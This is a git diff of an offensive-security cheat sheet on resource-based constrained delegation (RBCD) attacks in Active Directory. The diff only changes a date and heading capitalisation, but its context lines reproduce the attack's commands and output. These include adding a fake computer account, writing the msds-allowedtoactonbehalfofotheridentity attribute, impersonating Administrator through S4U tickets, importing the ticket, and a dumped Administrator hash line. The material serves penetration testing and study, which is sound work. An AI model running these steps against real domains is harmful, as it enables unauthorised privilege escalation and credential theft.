@@ -1,6 +1,6 @@
 ---
 title: "RBCD Attack"
-date: 2024-7-30
+date: 2025-7-25
 tags: ["Pass-The-Ticket", "Pass-The-Hash", "Silver Ticket", "Ticket Granting Ticket", "Active Directory", "Windows", "RBCD", "Resource-Based Constrained Delegation", "S4U", "Impersonate", "Credential Dumping"]
 ---
 
@@ -10,7 +10,7 @@ tags: ["Pass-The-Ticket", "Pass-The-Hash", "Silver Ticket", "Ticket Granting Tic
 {{< tab set1 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-#### 0. Check machine account quota
+#### 0. Check Machine Account Quota
 
 ```console
 nxc ldap <TARGET> -u '<USER>' -p '<PASSWORD>' -M maq
@@ -24,7 +24,7 @@ MAQ         10.10.11.10      389    DC               [*] Getting the MachineAcco
 MAQ         10.10.11.10      389    DC               MachineAccountQuota: 10
 ```
 
-#### 1. Add a fake computer
+#### 1. Add a Fake Computer
 
 ```console
 impacket-addcomputer -computer-name 'EvilComputer' -computer-pass '<COMPUTER_PASSWORD>' -dc-ip <DC_IP> '<DOMAIN>/<USER>:<PASSWORD>'
@@ -37,7 +37,7 @@ Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 [*] Successfully added machine account EvilComputer$ with password Test1234.
 ```
 
-#### 2. Rbcd attack
+#### 2. RBCD Attack
 
 ```console
 impacket-rbcd -delegate-to '<TARGET_COMPUTER>$' -delegate-from 'EvilComputer$' -dc-ip <DC_IP> -action 'write' '<DOMAIN>/<USER>:<PASSWORD>'
@@ -72,7 +72,7 @@ Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 [*] Saving ticket in administrator@cifs_dc.example.com@EXAMPLE.COM.ccache
 ```
 
-#### 4. Import ticket
+#### 4. Import Ticket
 
 ```console
 export KRB5CCNAME=administrator@cifs_<TARGET_DOMAIN>@<DOMAIN>.ccache
@@ -138,7 +138,7 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ddf32e17a6ac5ce04a8ecbf782ca
 
 <small>*Ref: [Powermad.ps1](https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1)*</small>
 
-#### 2. Check machine account quota
+#### 2. Check Machine Account Quota
 
 ```console
 Get-DomainObject -Identity 'DC=<EXAMPLE>,DC=<COM>' | select ms-ds-machineaccountquota
@@ -152,7 +152,7 @@ ms-ds-machineaccountquota
                        10
 ```
 
-#### 3. Create new computer account
+#### 3. Create New Computer Account
 
 ```console
 New-MachineAccount -MachineAccount EvilComputer -Password $(ConvertTo-SecureString '<COMPUTER_PASSWORD>' -AsPlainText -Force)
@@ -215,7 +215,7 @@ Get-DomainComputer <TARGET_COMPUTER> | Set-DomainObject -Set @{'msds-allowedtoac
 *Evil-WinRM* PS C:\Users\test.user\Documents> Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
 ```
 
-#### 5. Check if SecurityIdentifier is now fakesid 
+#### 5. Check if SecurityIdentifier is Now fakesid 
 
 ```console
 $RawBytes = Get-DomainComputer <TARGET_COMPUTER> -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
@@ -334,7 +334,7 @@ AuditFlags         : None
 [+] Ticket successfully imported!
 ```
 
-#### 7. Convert to ccache format
+#### 7. Convert to ccache Format
 
 ```console
 python3 rubeustoccache.py '<BASE64_TICKET>' secrets.kirbi secrets.ccache
